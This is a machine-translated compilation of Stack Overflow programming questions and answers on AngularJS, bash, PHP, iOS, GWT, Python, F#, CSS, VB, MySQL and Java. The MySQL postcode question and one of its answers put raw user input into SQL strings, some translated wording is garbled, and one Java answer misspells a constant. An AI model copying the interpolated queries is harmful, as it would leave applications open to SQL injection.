                    '<label ng-transclude></label>' +
                    '<label class="radio inline"><input type="radio" name="rdo{{valvar}}" value="1" ng-model="{{valvar}}">Yes </label>' +
                    '<label class="radio inline"><input type="radio" name="rdo{{valvar}}" value="0" ng-model="{{valvar}}">No </label>' +
                    '<hr></div>',
                replace: true,
        };
}); 
```

当我在输入标签*ng-model="{{valvar}}"*中使用时，会出现编译错误。

当我尝试改用*ng-click="{{valvar}} = 0"*时，我没有收到编译错误，但是当我单击单选按钮时，我获取 testVar 值的显示语句永远不会起作用。

**当我点击按钮时，我将如何解决这个问题，以便我的 HTML 的最后一行正确更新为 testVar 的值？**

我正在使用 AngularJS 和 Bootstrap。我对这两个框架都很陌生，所以我不确定这是否是最好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:00:04.100

要在隔离范围内获得双向绑定，请使用`=`：

```
scope: {
  valvar: '=qtnVariable',
}, 
```

`@`使结果范围变量成为带有插值的字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T00:59:16.217

Brandon 是对的，`=`在您的隔离范围中使用以获得双向绑定，但是您还需要做一件事：从您的`ng-model`声明周围删除花括号。

`ng-model`声明采用角度表达式并在范围内评估它们，因此无需大括号强制评估。事实上，牙套会把事情搞砸。

```
// so just
ng-model="valvar" 
```

[这是对您的代码进行这些更改的小提琴](http://jsfiddle.net/2PPLa/)。

# bash - 如何将合并输出到文件？

> ID：14903775
> 
> 赞同：1
> 
> 时间：2013-02-15T21:41:26.120
> 
> 标签：bash, merge

我一直按照这篇文章中的指示在目录中连接文件：[Unix：合并许多文件，同时删除所有文件的第一行](https://stackoverflow.com/questions/10103619/unix-merge-many-files-while-deleting-first-line-of-all-files)，但它无法正常工作。总而言之，这是正在使用的命令：

```
find . -name "*.extension" | xargs -n 1 tail -n +2 
```

我尝试将名称附加到该文件并像这样重定向：

```
find . -name "*.extension" | xargs -n 1 tail -n +2 > concatenated.csv 
```

但这只会抓取第一个文件。难道我做错了什么？我对这些命令非常陌生。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:50:25.833

问题是您的文件包含空格或引号，默认情况下 xargs 不喜欢这些。如果您使用 GNU 版本的 find 和 xargs，您可以使用

```
find . -name "*.extension" -print0 | xargs -0 -n 1 tail -n +2 > concatenated.csv 
```

安全地处理所有文件名。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:51:42.097

对于像这样的简单命令，您可以跳过`xargs`并只使用`-execdir`主命令：

```
find . -name "*.extension" -execdir tail -n +2 '{}' \; > concatenated.csv 
```

受凯文回答的启发，您也可以使用

```
find . -name "*.extension" -execdir tail -q -n +2 '{}' + > concatenated.csv 
```

它只会`tail`在所有文件上运行一次，而不是每个文件一次。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T22:01:21.110

`tail`您可能希望使用另一个可以一次处理更多文件的工具，而不是单独使用每个文件。例如`awk`：

```
find . -name '*.extension' -exec awk 'FNR > 1' + >concatenated.csv 
```

# php - PHP5 如何建立一个带有起始数组的类？

> ID：14903784
> 
> 赞同：0
> 
> 时间：2013-02-15T21:41:47.510
> 
> 标签：php, arrays, class, menu, menuitem

我在构建菜单时遇到问题，我想创建一个这样的类：

```
class leftMenu{

public $items;

    function addItem ($num){

        for($i = 0; $i < count($num); $i++){
              $this->items[$i] += $num;
              echo $this->items[$i];
            }

    }

public function __destruct() {
      //echo "\n</body>\n</html>";
    }

} 
```

我想像数组一样调用 addItem ，例如：

```
$menu = new leftMenu();
$menu->addItem("one", "two", "three"); // Here 1, 2, 3 should be an array 
```

我不能让它工作......请帮助！ND

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:45:41.640

您需要通过以下方式更新代码（我刚刚初始化了变量 $items ，以及您可以在评论中看到的另一个编辑）：

```
class leftMenu{

public $items = array();  //intialize your variable $items

    function addItem ($num){

        for($i = 0; $i < count($num); $i++){
              $this->items[$i] = $num[$i]; //Edit this line too
              echo $this->items[$i];
            }

    }

public function __destruct() {
      //echo "\n</body>\n</html>";
    }

} 
```

当你调用它时，像这样传递一个数组给它：

```
$menu = new leftMenu();
$menu->addItem(array("one", "two", "three")); // Here 1, 2, 3 should be an array 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:45:13.743

```
$items = array("one", "two", "three");

$menu->addItems($items);

function addItems($items = array()) {
  $this->items = $items;
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-15T21:46:04.253

您需要将变量作为数组传递。试试这个：

$menu->addItem(array("one", "two", "three"));

# ios - 从另一个类更新 BOOL 值

> ID：14903786
> 
> 赞同：0
> 
> 时间：2013-02-15T21:42:02.740
> 
> 标签：ios, ios5, uiviewcontroller, boolean, implicit-conversion

我已经设置了一个具有以下内容的类： MESSidePanelViewControllerSubClass 头文件

```
@property BOOL setLandscapeOK; 
```

小鬼文件

```
- (NSInteger)supportedInterfaceOrientations {
    // Restriction for the welcome page to only allow potrait orientation

    if (setLandscapeOK == YES) {
        NSLog(@"Reveal-setting all");
        return UIInterfaceOrientationMaskAll;
    }
    NSLog(@"Reveal-setting portrait");
    return UIInterfaceOrientationMaskPortrait;
} 
```

我现在想从另一个文件（视图控制器）更新值。
LoginViewController 其他视图控制器 imp 文件

```
- (NSInteger)supportedInterfaceOrientations {
    // Restriction for the welcome page to only allow potrait orientation
    NSLog(@"Login-supportInterfaceOrientations");
    MESSidePanelViewControllerSubClass* setLandscapeOK = YES;
    return UIInterfaceOrientationMaskAll;
} 
```

我收到一个错误：

```
Implicit conversion of 'BOOL' (aka 'signed char') to 'MESSidePanelViewControllerSubClass *' is disallowed with ARC 
```

我应该如何更新另一个文件中的 BOOL 值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:23:06.380

不应该`-supportedInterfaceOrientations`总是 `MESSidePanelViewControllerSubClass`返回`UIInterfaceOrientationMaskPortrait`吗？如果将 的实例`MESSidePanelViewControllerSubClass`作为子视图控制器推送，那不会强制您的 UI 方向为纵向吗？你试过吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:20:45.623

这一行是错误的：

```
MESSidePanelViewControllerSubClass* setLandscapeOK = YES; 
```

它应该是这样的：（mESSidePanelViewControllerSubClass 也可能是一个 iVar，并在您的 supportedInterfaceOrientations 方法之外的某个地方实例化。）

```
 MESSidePanelViewControllerSubClass *mESSidePanelViewControllerSubClass = [MESSidePanelViewControllerSubClass alloc] init]; 
```

然后：

```
mESSidePanelViewControllerSubClass.setLandscapeOK = YES; 
```

编辑添加到[delegate](https://stackoverflow.com/questions/8055052/call-a-parent-view-controller-through-a-navigationcontroller)的链接。

# gwt - Maven GWT（SmartGWT）：如何组织我的项目以防止长时间编译

> ID：14903788
> 
> 赞同：0
> 
> 时间：2013-02-15T21:42:36.263
> 
> 标签：gwt, maven, compilation, smartgwt

亲爱的 StackOverflow 用户，

我想将我用 SmartGWT 编写的、由 maven 编译的巨大应用程序拆分为几个子项目，例如：common、custom-widgets、forms、custom-datasources、sites。

主要思想是：一旦子项目被 GWT 编译，就可以很容易地在其他子项目中使用，从而再次跳过编译。（对不起我的英语，但我想你明白了我的意思）

示例子项目`pom.xml`是：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>eu.nanobeauty</groupId>
        <artifactId>nanobeauty</artifactId>
        <version>1.0-SNAPSHOT</version>
    </parent>
    <artifactId>common</artifactId>
    <packaging>jar</packaging>
    <name>nanoBeauty :: Common</name>
    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>gwt-maven-plugin</artifactId>
                <version>${gwt.version}</version>
                <executions>
                    <execution>
                        <goals>
                            <goal>compile</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project> 
```

`Common.gwt.xml`是 ：

```
<module>
    <inherits name="com.google.gwt.user.User"/>
    <inherits name="com.smartgwt.SmartGwtNoTheme"/>
    <source path="common"/>
</module> 
```

父母`pom.xml`是：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>eu.nanobeauty</groupId>
    <artifactId>nanobeauty</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>pom</packaging>
    <name>nanoBeauty :: Parent</name>

    <modules>
        <module>datasources</module>
        <!-- multimodule : each form different project -->
        <module>forms</module>
        <!-- multimodule : each site different project -->
        <module>sites</module>
        <module>common</module>
    </modules>

    <properties>
        <gwt.version>2.5.0</gwt.version>
        <smartgwt.version>3.1</smartgwt.version>
        <java.version>1.6</java.version>
        <webappDirectory>${project.build.directory}/${project.build.finalName}</webappDirectory>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.war.plugin.version>2.1.1</maven.war.plugin.version>
    </properties>

    <repositories>
        <repository>
            <id>smartclient</id>
            <url>http://smartclient.com/maven2</url>
        </repository>
    </repositories>

    <dependencies>
        <dependency>
            <groupId>com.smartgwt</groupId>
            <artifactId>smartgwt</artifactId>
            <version>${smartgwt.version}</version>
        </dependency>
        <dependency>
            <groupId>com.google.gwt</groupId>
            <artifactId>gwt-servlet</artifactId>
            <version>${gwt.version}</version>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>com.google.gwt</groupId>
            <artifactId>gwt-user</artifactId>
            <version>${gwt.version}</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>2.3.2</version>
                <configuration>
                    <source>${java.version}</source>
                    <target>${java.version}</target>
                </configuration>
            </plugin>
        </plugins>
    </build>

</project> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T10:49:33.437

经过漫长的谷歌搜索，我找到了解决方案：

它不能以我想要实现的方式完成。

GWT 需要源文件来生成 JS 文件。主模块`pom.xml`没问题，上面的示例`.gwt.xml`文件也没问题。唯一的变化是在子模块`pom.xml`文件中，唯一的目标是`resources`.

因此，对于我需要设置的每个子模块`pom.xml`，它看起来类似于：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>eu.nanobeauty</groupId>
        <artifactId>nanobeauty</artifactId>
        <version>1.0-SNAPSHOT</version>
    </parent>
    <artifactId>common</artifactId>
    <packaging>jar</packaging>
    <name>nanoBeauty :: Common</name>
    <build>
        <plugins>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>gwt-maven-plugin</artifactId>
                <version>${gwt.version}</version>
                <executions>
                    <execution>
                        <goals>
                            <goal>resources</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project> 
```

基于此文件：

*   [资源目标](http://mojo.codehaus.org/gwt-maven-plugin/resources-mojo.html)
*   [多模块项目](http://mojo.codehaus.org/gwt-maven-plugin/user-guide/project.html#Multi-project_setup)

# python - 如何在 Python 中将整数的两个字节转换回整数？

> ID：14903791
> 
> 赞同：6
> 
> 时间：2013-02-15T21:42:44.633
> 
> 标签：python, serial-port, byte, arduino

我目前正在使用一个`Arduino`通过串行（使用`pySerial`）将一些整数（int）输出到我正在编写的用于`Arduino`与之通信的Python脚本`X-Plane`，一个飞行模拟程序。

我设法将原始数据分成两个字节，以便我可以将其发送到脚本，但我在重建原始整数时遇到了一些麻烦。

我尝试使用基本的按位运算符（<<、>> 等），就像在 C++ 类程序中所做的那样，但它似乎不起作用。

我怀疑它与数据类型有关。我可能在相同的操作中使用带字节的整数，但我无法真正分辨每个变量的类型，因为据我所知，您并没有真正在 Python 中声明变量（我对 Python 很陌生） .

```
self.pot=self.myline[2]<<8
self.pot|=self.myline[3] 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-16T12:37:15.423

您可以使用该`struct`模块在整数和字节表示之间进行转换。在您的情况下，要将 Python 整数转换为两个字节并返回，您可以使用：

```
>>> import struct
>>> struct.pack('>H', 12345)
'09'
>>> struct.unpack('>H', '09')
(12345,) 
```

第一个参数`struct.pack`并`struct.unpack`表示您希望如何格式化数据。`>`在这里，我通过使用前缀（您可以`<`用于 little-endian 或native）来要求它处于大结尾模式`=`，然后我说有一个由`H`.

其他可能性包括`b`有符号字节、`B`无符号字节、`h`有符号短整数（16 位）、`i`有符号 32 位整数、`I`无符号 32 位整数。您可以通过查看`struct`模块的文档来获取完整列表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T22:19:58.440

`myline`假设存储的数据首先具有高字节，那么您所拥有的基本上应该可以工作：

```
myline = [0, 1, 2, 3]
pot = myline[2]<<8 | myline[3]

print 'pot: {:d}, 0x{:04x}'.format(pot, pot)  # outputs "pot: 515, 0x0203" 
```

否则，如果它首先是低字节，则需要执行相反的操作：

```
myline = [0, 1, 2, 3]
pot = myline[3]<<8 | myline[2]

print 'pot: {:d}, 0x{:04x}'.format(pot, pot)  # outputs "pot: 770, 0x0302" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-02-08T06:41:02.677

例如，使用 Big Endian 编码：

```
int.from_bytes(my_bytes, byteorder='big') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:49:54.287

这完全有效：

```
long = 500
first = long & 0xff  #244
second = long >> 8  #1
result = (second << 8) + first #500 
```

如果您不确定“myline”中的类型，请查看 Stack Overflow 问题*[如何确定 Python 中的变量类型？](https://stackoverflow.com/questions/402504)*.

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-02-15T21:56:19.023

要将字节或字符转换为其表示的数字，请使用`ord()`. 这是从 int 到 bytes 并返回的简单往返：

```
>>> number = 3**9
>>> hibyte = chr(number / 256)
>>> lobyte = chr(number % 256)
>>> hibyte, lobyte
('L', '\xe3')
>>> print number == (ord(hibyte) << 8) + ord(lobyte)
True 
```

如果你的`myline`变量是字符串或字节串，你可以使用上面最后一行的公式。如果它以某种方式是整数列表，那么您当然不需要`ord`.

# objective-c - 调用-drawRect后如何在UIView中绘制文本

> ID：14903794
> 
> 赞同：2
> 
> 时间：2013-02-15T21:43:05.757
> 
> 标签：objective-c, cgcontext

我有一个 iPad 应用程序、XCode 4.5、iOS 6.1 和 Storyboards。我有一个 UIView，其中嵌入了两 (2) 个 UIView。第一个 UIView（称为 Calendar）在上半部分，第二个 UIView（称为 Schedule）在下半部分。我在上半部分创建了一个日历，并在下半部分绘制了一个网格以显示日程安排。

事件的顺序是向用户呈现带有日历（当前月份完全填写）和时间表（显示一个空网格）的场景。在日历上点击某一天时，该天的日程安排将显示在日程安排视图中。

该问题`-drawRect`在最初显示场景时被调用，在用户能够选择要显示日程的日期之前。由于我必须从 -drawRect 内部进行绘图，因此我无法弄清楚如何在`-drawRect`. 我想知道使用**setNeedsDisplayInRect:**是否会完成我需要做的事情？

我已经查看了 SO 和 Google 好几天了，但没有发现任何可以回答这个特定问题的东西。这不是[这个问题](https://stackoverflow.com/questions/11216065/how-to-draw-graphic-objects-within-drawrect-at-different-times)的重复，而是一个后续项目，因为该项目已被重新定义。任何想法将不胜感激。

**更新：**这是我使用 setNeedsDisplayInRect 的代码：

```
- (void) drawSchedule  {
    const float rectWidth = 120.0;

    //  draw detail for selected day for each staff member
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetStrokeColorWithColor(context, [UIColor blueColor].CGColor);
    CGContextSetLineWidth(context, 1.0);
    CGContextSetRGBFillColor(context, 0, 0, 1, 0.3); 

    UIGraphicsBeginImageContext(self.bounds.size);

    //  draw customer name using bounds from CGRectMake
    const float nameFontSize = 12;
    UIFont *hourfont=[UIFont systemFontOfSize: nameFontSize];
    [[UIColor blackColor] set];
    [self setNeedsDisplayInRect: CGRectMake(160.0, 150.0, 120.0, 50.0)];  //  mark as needs to be redrawn

    //  customer for this time slot
    [@"John Doe" drawAtPoint:CGPointMake(114, 40) withFont:hourfont];
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-23T04:39:06.863

> 在日历上点击某一天时，该天的日程安排将显示在日程安排视图中。

当您用户点击日历上的某一天时，告诉 Schedule 进行更改：

```
 [self.calendarView displayDate: thatDay]; 
```

反过来，Schedule 会收到消息，弄清楚它需要做什么，并告诉自己在绘制时间时重新显示。

```
 - (void) displayDate: (YourDateObject*) thatDay
 {
      self.date=thatDay;
      [self setNeedsDisplay: YES]
  } 
```

现在，系统将`drawRect:`在适当的时间调用日程表，您将显示新的日程表。

一般规则很简单：当你知道视图的状态时设置它，并在被询问时让视图重新显示自己。不要试图说“画这个”；而是说，“这是你下次应该画的。一旦你准备好了，举手；老师会叫你的。”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:07:11.217

也许你可以使用 UIView 的方法：*setNeedsDisplay*。这将导致 drawRect: 被再次调用。或者，如果您只想重绘视图的一部分，您可以使用*setNeedsDisplayInRect* :，正如您所提到的。你永远不应该调用 drawRect: 自己。

```
UIGraphicsBeginImageContext(self.bounds.size)
[@"John Doe" drawAtPoint:CGPointMake(114,40) withFont:hourFont];
UIimage *image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

UIImageView *imageView = [[UIImageView alloc] initWithImage:image]; 
```

然后您可以使用*imageView*将其作为子视图添加到您的视图中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-18T00:08:45.127

通常，您应该在该`drawRect:`方法中完成所有绘图。当用户点击日历中的日期时，您只需将`setNeedsUpdate`消息发送到日程视图。然后调度视图会自动重绘并调用自己的`drawRect:`方法。

调用`setNeedsDisplayInRect:`(or `setNeedsDisplay`) 只是通知系统需要重绘接收器。您的方法将在*稍后*`drawRect:`的某个时间点被调用，此时适合执行实际绘图。

 ** * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-19T16:14:37.513

这个问题没有实际意义；您无法清除 UIView 上的绘图，这使得这种设计不可行。

我现在正在考虑在计划网格顶部使用 UITableViews 或 UIView 子视图，这会带来新问题。

谢谢大家的意见。*

# f# - f#：导致 Intellisense 抱怨的签名文件？

> ID：14903798
> 
> 赞同：2
> 
> 时间：2013-02-15T21:43:29.937
> 
> 标签：f#, signature-files

鉴于以下代码...

```
type IMyInterface =
    abstract BoolA : bool
    abstract BoolB : bool
let myFn _boolVal (_i: IMyInterface) = if _boolVal then _i.BoolA else _i.BoolB
let myFnTrue = myFn true
let myFnFalse = myFn false 
```

... Intellisense 抱怨，并且编译器失败，如果我在其中创建一个签名文件：

```
type IMyInterface =
    abstract BoolA : bool
    abstract BoolB : bool
val myFnTrue : (IMyInterface -> bool)
val myFnFalse : (IMyInterface -> bool) 
```

错误是`Error 10 Module 'MyModule' contains val myFnTrue : ('_a -> bool) when '_a :> MyModule.IMyInterface but its signature specifies val myFnTrue : (MyModule.IMyInterface -> bool) The types differ`。（报告了类似的错误`myFnFalse`。）

我觉得自己像个白痴，无法弄清楚这一点。我究竟做错了什么？（支持“duh”的答案......）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:46:05.257

在您的签名文件中，`myFnTrue`并且`myFnFalse`具有签名`IMyInterface -> bool`但在您的实现`'a -> bool`中具有约束`'a :> IMyInterface`（由于[自动泛化](http://msdn.microsoft.com/en-us/library/dd233183.aspx)），也就是说，实现是通用的，而签名不是。

最简单的解决方案是将您的实现更改为：

```
let myFnTrue i = myFn true i
let myFnFalse i = myFn false i 
```

# html - HTML/CSS/Ruby on Rails 标头，带有突出到页面内容的徽标

> ID：14903799
> 
> 赞同：0
> 
> 时间：2013-02-15T21:43:30.810
> 
> 标签：html, css, ruby-on-rails, twitter-bootstrap

我希望能够从标题中突出一个徽标，请参阅[此链接](http://journalxtra.com/websiteadvice/wordpress/themes/studiopress-genesis-theme-framework/how-to-overhang-a-wordpress-header-image-in-genesis-5268/)以获取视觉示例。根据我的搜索，大多数结果都是关于使用 WordPress 实现这一点，而不仅仅是 HTML/CSS（包括提供的链接）。我将 RoR 与 Twitter Bootstrap 一起使用，以创建一些快速的页面样式，包括标题（可能是相关信息）。

我猜这个问题的答案确实是以 HTML/CSS 为中心的，所以，如果我有一个标题`<div>`，其中包含左侧的徽标以及右侧的一组导航链接，我该怎么做标志悬垂到下面页面的其余部分？

此外，如果能够为悬垂部分添加轻微阴影，则可以加分:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:48:07.320

您可以使用 z-index 属性 (CSS) 设置您的徽标图像，使其始终位于前面，然后您可以将图像放置在标题中，它看起来就像是挂着的。轻微的阴影应该是图像本身的一部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-16T22:48:36.243

尝试使用css代码

```
position: absolute; 
```

这将确保您的徽标漂浮在您想要的任何地方。然后调整您希望如何放置徽标图像：

```
margin-top: 100px; 
```

使用你想要的任何 px。

# asp.net - 这在英语中是什么意思？

> ID：14903800
> 
> 赞同：0
> 
> 时间：2013-02-15T21:43:31.350
> 
> 标签：asp.net, vb.net, asp-classic

我遇到了一段代码，上面写着，

```
If (ProcessID <> 0) And ("O" <> sProcessStatus And "E" <> sProcessStatus) Then
    ' Do stuff
End If 
```

我不明白的是第二个条件......有人可以告诉我我是否已经离开了。

第二个条件是否说如果`sProcessStatus`不是 O 和 E 然后做某事？

完整性检查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:45:28.653

是的，这意味着只有在以下所有条件都为真时才会为真：

*   `ProcessID`不是零
*   `sProcess`是除`"O"`或以外的任何东西`"E"`

一定要喜欢*尤达的条件*。“哦”不是！带“E”的力不是...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:44:41.567

如果第一个条件不是 0
并且
如果第二个条件不是“O”而不是“E”，那么做一些事情，是的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:45:20.953

第二部分是说如果 sProcessStatus 不是 O 并且 sProcessStatus 不是 E 然后执行操作

换句话说（这不是正确的语法，只是更容易阅读）

```
if spProcessSatus NOT IN ('O','E') {
 process
} 
```

# php - mysql 邮编搜索

> ID：14903802
> 
> 赞同：1
> 
> 时间：2013-02-15T21:44:04.890
> 
> 标签：php, mysql

晚上所有。

我有一个房地产网站的 mysql 数据库。有一个搜索表单，人们可以在同一字段中输入位置或邮政编码。

SQL的一部分是

```
PostCode LIKE '$Loc% 
```

我的问题是有些人输入这样的邮政编码：“l236yt”，有些人输入这样的空格“l23 6yt”。

数据库包含带有空格的邮政编码，那么如何使它在有或没有空格的情况下工作？

任何帮助将不胜感激

谢谢巴兹

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T00:58:56.143

您的首要任务是从查询中删除 LIKE 条件。使用 LIKE 条件会强制 MySQL 评估表中的每一行，而且效率非常低。除非绝对必要，否则尽量避免使用 LIKE。为了更改查询的这一部分，您需要将其替换为：

```
PostCode = "$Loc" 
```

这为您提供了两个选项：

1）清理您的输入。邮政编码遵循众所周知的格式，因此可以将某人输入的值转换为您期望的值。然后就可以继续搜索了。由于 $Loc 将完全匹配您在数据库中的内容，因此在您的数据库中找到它会非常快（当然前提是您已经索引了该字段！）。

2）用多个值重载数据库以表示相同的邮政编码。这意味着您可以将“l236yt”和“l23 6yt”都放入数据库中，并将它们当作不同的值来处理。当您只想搜索邮政编码的第一部分（例如“l23”）时，这也很有帮助，但只有在邮政编码和位置之间存在一对多关系时才有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:46:18.823

假设数据库中的值没有空格，只需将用户值清理为没有空格的值：

```
$val = str_replace(' ', '', $val); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:46:43.800

您可以将字符串转换为字符数组，然后搜索空格，如果找不到，则可以继续插入空格（空格将始终位于 6 字符邮政编码中的第三个字符之后，之后7个字符的邮政编码中的第四个字符，所以你可以使用正则表达式很简单地做到这一点。我相信也有5个字符长的邮政编码，这些会像A1 1AA，所以在第二个字符之后你会发现空间。

由于我缺乏语言知识，我无法提供精确的代码，但祝你好运！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:51:58.773

需要一个有效的邮政编码作为输入（带或不带空格），并将其分解为组成部分，并在适当的位置用空格整齐地返回它

```
function parsePostcode($postcode) {
    $postcode = preg_replace('/\s*/','',strtoupper($postcode));

    $sector = substr($postcode,0,-2);
    $outcode = $district = substr($sector,0,-1);

    list($area) = sscanf($district,'%[A-Z]');
    $incode = substr($postcode,-3);

    return array(
        'postcode'  => $postcode,
        'formatted' => $outcode.' '.$incode,
        'area'      => $area,
        'district'  => $district,
        'sector'    => $sector,
        'outcode'   => $outcode,
        'incode'    => $incode,
    );
} 
```

# java - currentTimeMillis() 中的 4 小时

> ID：14903806
> 
> 赞同：2
> 
> 时间：2013-02-15T21:44:21.967
> 
> 标签：java, android

我有一个简单的问题，我有以下函数，并且有一个参数叫做`cacheTime`，我怎样才能将它设置为 4 小时，我应该将它设置为`4 * 3600000`吗？

```
public static File getCache(String name, Context c, int cacheTime) 
{
    if (cacheTime <= 0)
        return null;
    File cache = new File(c.getCacheDir(), name);
    long now = System.currentTimeMillis();
    if (cache.exists() && (now - cache.lastModified() < cacheTime))
        return cache;
    return null;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-15T21:50:53.493

毫秒是 1/1000 秒。所以 4 小时将是 4 * 60 * 60 * 1000 = 14,400,000

对于缓存失效，这可能很好。也就是说，日期数学通常很危险。当处理比毫秒更大的时间单位时，在夏令时转换、闰秒和日历本应处理的所有其他事情时，很容易被绊倒。在某些情况下，罕见的不精确是可以接受的，而在其他情况下则不是。做日期数学时要小心。

要以更大的时间单位（例如 +1 天）确定人类消耗时间，请使用 Calendar.roll()。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-15T21:51:51.867

学习使用方便的[TimeUnit](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/TimeUnit.html)枚举，以便您可以执行以下操作：

```
TimeUnit.Hours.toMillis(4) 
```

并且不要依赖整个代码中的餐巾数学和魔术数字。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-15T21:48:12.360

```
// 4 hours * 60 (min/hour) * 60 (sec/min) * 1000 (msec/sec)
getCache(name, c, 4 * 3600 * 1000); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-15T21:48:02.373

```
4 * 1000 * 3600 
```

一秒有 1000 毫秒，一小时有 3600 秒。

# php - 使用 AJAX 安全地导入受保护的 js 文件的内容

> ID：14903808
> 
> 赞同：0
> 
> 时间：2013-02-15T21:44:26.957
> 
> 标签：php, javascript, security, jquery, import

导入 js 文件很简单……只需使用*>script src='file.js' type='text/javascript'>>/script>*。
但随后源代码将显示文件内容的直接 url。

内容应该是可执行的，但不能通过使用源 url 直接查看。
**使用 AJAX 将 file.js 的内容加载到内存的最佳方法是什么。**

我来到了以下最初的工作方式（只是和想法，完全有缺陷？）：

```
function get_contents() {

      -> ajax execute PHP {copy 'file.js' to 'token.js' in tmp-directory}
      -> ajax get contents of 'tmp/token.js' and load to memory
      -> ajax execute PHP {delete 'tmp/token.js' in tmp-directory}

      return(true);    // content (ie. functions) should now be usable
      } 
```

但我不确定第二个 ajax 执行是否足以现在能够成功调用这些函数。
PHP 返回内容，但 javascript 'ajax success' 可能会将其视为（并将其存储）为一个变量... doh！

这个ajax成功的想法会奏效吗？
有人可以提出一个更好的主意吗？

**编辑：**
根据最初的回应，这种工作方式实际上是人类不可能的。
将通过以“正常”不受保护的方式加载常用函数来解决它，并使用 Jerry 的建议（见评论）进行不太频繁发生的计算。

**编辑#2：**
下面提到的（耗时）问题可以通过下面的模板来解决。
仍在使用建议的“隐藏 PHP 代码”方法。
我正在使用缓冲区（或总和），例如 Youtube 视频......除了“视频数据”是“AJAX-PHP 函数的结果”。

```
AJAX request "30 cycle", "60 cycle", "300 cycle", "600 cycle"
     store result to buffer
initiate "start cycle"

function cycle() // run every second !!
{
//do stuff... no AJAX needed
//do some more stuff... like animations and small calculations

//per 30 cycle (30 seconds)
if ($cycle==30)
    {
    perform last "30 cycle" AJAX result [PHP-function set "A"]
    ... when finished: AJAX request "30 cycle"
                            store result to buffer in 'background'
    }

//per 60 cycle (1 minute)
if ($cycle==60)
    {
    perform last "60 cycle" AJAX result [PHP-function set "B"]
    ... when finished: AJAX request "60 cycle"
                            store result to buffer in 'background'
    }

//and so on....
} 
```

最初的问题 99% 已解决（-1 因为开发人员工具）。
感谢您的评论和建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T23:35:53.137

即使您将 JavaScript 文件拆分为许多单独的函数，也只需很少的工作即可将它们重新组合在一起。

使用现代浏览器，即使文件“加载到内存中”，您也可以准确地看到加载的内容。

尝试使用浏览器附带的开发人员工具，您可以使用它们查看何时进行 Ajax 调用，以及以文本格式加载的确切内容。

如果您混合使用 PHP 和 JavaScript，那么您应该在 PHP 代码中添加任何敏感的内容，同时使用 JavaScript 来展示 PHP 提供的结果。

**编辑：根据您的更新，您可以不执行“循环”而不是执行此操作吗？**

```
 function pollAjax()
{
   $.ajax({
